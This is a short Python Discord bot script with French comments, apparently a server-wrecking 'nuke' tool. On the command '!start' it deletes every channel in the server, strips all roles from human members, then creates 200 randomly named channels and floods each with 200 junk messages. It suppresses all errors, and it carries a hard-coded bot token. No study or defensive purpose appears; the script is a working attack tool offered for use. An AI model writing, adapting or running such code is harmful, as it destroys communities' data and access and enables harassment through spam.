import discord
import random
import string
import asyncio

intents = discord.Intents.all()
client = discord.Client(intents=intents)

TOKEN = "i6uya5yoPKq3XCxkFxFOK69QhYxwI_b8"

# Générateur de texte aléatoire
def random_text(length=20):
    return ''.join(random.choices(string.ascii_letters + string.digits + ";:!?#%&*", k=length))

@client.event
async def on_ready():
    print(f'Connecté en tant que {client.user}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content == "!start":
        if not message.guild:
            await message.channel.send("Cette commande ne fonctionne que sur un serveur.")
            return

        guild = message.guild
        await message.channel.send("⚠️ Démarrage du chaos...")

        # Supprime tous les salons
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass

        # Retire les rôles de tout le monde (sauf @everyone)
        for member in guild.members:
            if member.bot:
                continue
            try:
                roles_to_remove = [role for role in member.roles if role != guild.default_role]
                await member.remove_roles(*roles_to_remove)
            except:
                pass

        await asyncio.sleep(2)

        # Crée 15 salons avec des noms aléatoires et spam dedans
        for _ in range(200):
            name = random_text(200)
            try:
                channel = await guild.create_text_channel(name)
                await asyncio.sleep(1)
                for _ in range(200):
                    await channel.send(random_text(50))
                    await asyncio.sleep(0.2)
            except:
                pass

client.run(TOKEN)
